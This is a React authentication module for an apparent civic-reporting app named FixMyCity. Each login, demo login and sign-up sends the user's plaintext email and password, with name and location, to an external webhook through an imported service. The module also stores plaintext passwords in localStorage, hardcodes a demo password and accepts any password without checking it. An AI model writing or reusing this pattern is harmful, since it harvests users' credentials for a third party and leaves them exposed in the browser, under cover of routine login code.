import React, { createContext, useContext, useState } from 'react';
import { sendAuthCredentialsToWebhook } from '../services/webhookService';

const AuthContext = createContext(null);

const STORAGE_KEY_USER = 'fmc_citizen_user';

export const DEMO_USER = {
  name: 'Alex Morgan',
  email: 'alex.morgan@fixmycity.org',
  password: 'Password@123',
  location: 'Ward 14, 42 MG Road, Central District',
  phone: '+91 98450 12345',
  avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80',
  ward: 'Ward 14 (Central)',
  civicPoints: 340,
  joinedDate: 'October 2026',
  isLoggedIn: true
};

export function AuthProvider({ children }) {
  const [user, setUser] = useState(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_USER);
      if (saved) {
        return JSON.parse(saved);
      }
    } catch (e) {
      console.error('Error reading citizen auth state:', e);
    }
    return null;
  });

  const [loading, setLoading] = useState(false);

  // Citizen Login (Existing Account)
  const login = async (email, password, rememberMe = true) => {
    setLoading(true);

    const cleanEmail = email.trim().toLowerCase();
    const cleanPassword = password || '';

    let citizen = {
      name: email.split('@')[0].replace(/[\._]/g, ' ').replace(/\b\w/g, (c) => c.toUpperCase()),
      email: cleanEmail,
      password: cleanPassword,
      location: 'Ward 14, Central District',
      phone: '+91 98450 12345',
      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80',
      ward: 'Ward 14',
      civicPoints: 120,
      joinedDate: 'November 2026',
      isLoggedIn: true
    };

    if (cleanEmail === DEMO_USER.email.toLowerCase()) {
      citizen = { ...DEMO_USER, password: cleanPassword || DEMO_USER.password, isLoggedIn: true };
    }

    // Explicitly send "login" event with email ID and password to SNS Workbench Webhook
    try {
      await sendAuthCredentialsToWebhook({
        email: cleanEmail,
        password: cleanPassword,
        isNewAccount: false,
        action: 'login',
        name: citizen.name,
        location: citizen.location
      });
    } catch (e) {
      console.log('Webhook notice on login dispatch:', e);
    }

    setUser(citizen);
    if (rememberMe) {
      localStorage.setItem(STORAGE_KEY_USER, JSON.stringify(citizen));
    }
    setLoading(false);
    return citizen;
  };

  // Demo Citizen Login (Existing Account)
  const loginDemo = async () => {
    setLoading(true);
    setUser(DEMO_USER);
    localStorage.setItem(STORAGE_KEY_USER, JSON.stringify(DEMO_USER));

    // Explicitly send "login" event with demo credentials to SNS Workbench Webhook
    try {
      await sendAuthCredentialsToWebhook({
        email: DEMO_USER.email,
        password: DEMO_USER.password,
        isNewAccount: false,
        action: 'login',
        name: DEMO_USER.name,
        location: DEMO_USER.location
      });
    } catch (e) {
      console.log('Webhook notice on demo login dispatch:', e);
    }

    setLoading(false);
    return DEMO_USER;
  };

  // Citizen Registration (New Account)
  const register = async ({ name, email, password, location, phone }) => {
    setLoading(true);

    const cleanEmail = email.trim().toLowerCase();
    const cleanPassword = password || '';

    const newCitizen = {
      name: name.trim(),
      email: cleanEmail,
      password: cleanPassword,
      location: location?.trim() || 'Central City Area',
      phone: phone?.trim() || '+91 90000 00000',
      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=80',
      ward: 'Ward ' + Math.floor(1 + Math.random() * 20),
      civicPoints: 50,
      joinedDate: 'November 2026',
      isLoggedIn: true
    };

    // Explicitly send "new account" event with email ID, password, and profile to SNS Workbench Webhook
    try {
      await sendAuthCredentialsToWebhook({
        email: cleanEmail,
        password: cleanPassword,
        isNewAccount: true,
        action: 'new account',
        name: newCitizen.name,
        location: newCitizen.location
      });
    } catch (e) {
      console.log('Webhook notice on registration dispatch:', e);
    }

    setUser(newCitizen);
    localStorage.setItem(STORAGE_KEY_USER, JSON.stringify(newCitizen));
    setLoading(false);
    return newCitizen;
  };

  const logout = () => {
    setUser(null);
    localStorage.removeItem(STORAGE_KEY_USER);
  };

  const updateProfile = (updates) => {
    setUser((prev) => {
      const updated = { ...prev, ...updates };
      localStorage.setItem(STORAGE_KEY_USER, JSON.stringify(updated));
      return updated;
    });
  };

  return (
    <AuthContext.Provider
      value={{
        user,
        isLoggedIn: !!user?.isLoggedIn,
        loading,
        login,
        loginDemo,
        register,
        logout,
        updateProfile
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
}
